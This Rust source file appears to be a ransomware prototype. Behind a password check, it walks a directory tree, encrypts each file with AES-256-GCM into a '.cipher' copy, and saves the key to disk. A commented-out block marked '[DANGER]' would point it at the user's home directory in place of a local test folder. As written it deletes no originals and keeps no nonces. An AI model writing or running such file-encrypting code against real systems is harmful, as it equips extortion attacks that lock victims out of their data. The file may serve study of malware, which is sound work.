// Imports {{{
use std::env;
use std::fs::{self, File};
use std::io::{self, Write};
use std::path::{Path, PathBuf};
use std::process;

use aes_gcm::aead::Aead;
use aes_gcm::{
    Aes256Gcm, Nonce,
    aead::{KeyInit, OsRng},
};
use pbkdf2::{
    Pbkdf2,
    password_hash::{
        PasswordHash,
        PasswordHasher,
        PasswordVerifier, // rand_core::OsRng,
        SaltString,
    },
};
use rand;
// }}}

fn main() {
    // Password hash
    const STORED_HASH: &str = "$pbkdf2-sha256$i=600000,l=32$xnmJ40GIbyd8qnPS40c/5g$W3u+OKQtzpZIabIWQpcBKGFUNqPC9B9JCWeBmXQVfN0";

    // Parse command line arguments
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        eprintln!(":: [-] :: Password was not provided");
        process::exit(1);
    }

    // Parsed hash
    let parsed_hash = PasswordHash::new(STORED_HASH).unwrap();
    if Pbkdf2.verify_password(args[1].as_bytes(), &parsed_hash).is_err() {
        eprintln!(":: [-] :: Password incorrect");
        process::exit(1);
    }

    // [DANGER] - Get home directory {{{
    // let mut path = if cfg!(target_os = "windows") {
    //     env::var_os("USERPROFILE").map(PathBuf::from)
    // } else {
    //     env::var_os("HOME").map(PathBuf::from)
    // }
    // .expect(":: [-] :: Home directory");
    // }}}

    // Get current directory {{{
    let mut path = env::current_dir().expect(":: [-] :: Current directory");
    path.push("src");
    path.push("target");
    println!(":: [i] :: Current directory :: {:?}", &path);
    // }}}

    // Discover files {{{
    let ret = discover_dirs(&path).unwrap_or_else(|err| {
        eprintln!(":: [-] :: {}", err);
        process::exit(1);
    });
    // }}}

    // Encryption key - generate random
    let key = Aes256Gcm::generate_key(OsRng);
    println!(":: [i] :: Encryption key :: {:?}", &key);

    // Encryption key - save to a file
    let key_file = Path::new("encryption.key");
    let mut file = File::create(key_file).expect(":: [-] :: Failed to create file");
    file.write_all(&key)
        .expect(":: [-] :: Failed to write to file");

    // Iterate over files
    for file in ret {
        // Read file content {{{
        let content_res = fs::read(&file);
        let content = match content_res {
            Ok(res) => res,
            Err(err) => {
                eprintln!(":: [-] :: Content :: {}", err);
                return;
            }
        };

        println!(":: [i] :: File :: {:?}", &file);
        // }}}

        // Generate random nonce bytes {{{
        let nonce_bytes = rand::random::<[u8; 12]>();
        let nonce = Nonce::from_slice(&nonce_bytes); // 96-bits, unique per message
        // }}}

        // Encrypt plain text {{{
        let cipher = Aes256Gcm::new(&key);
        let ciphertext = cipher
            .encrypt(&nonce, content.as_ref())
            .expect(":: [-] :: Encrypt plain text");
        // }}}

        // Create encrypted file {{{
        let mut out_path = file.clone();
        out_path.set_extension("cipher");

        let mut file = File::create(out_path).expect(":: [-] :: Creating file");

        file.write_all(&ciphertext)
            .expect(":: [-] :: Write ciphertext");
        // }}}

        // Decrypt ciphertext {{{
        let plain_text = cipher
            .decrypt(&nonce, ciphertext.as_ref())
            .expect(":: [-] :: Decrypt ciphertext");
        // }}}
    }
}

fn discover_dirs(path: &PathBuf) -> io::Result<Vec<PathBuf>> {
    let mut files = Vec::new();
    let entries = fs::read_dir(path)?;

    for entry in entries {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            let mut sub_files = discover_dirs(&path)?;
            files.append(&mut sub_files);
        } else {
            files.push(path);
        }
    }

    Ok(files)
}
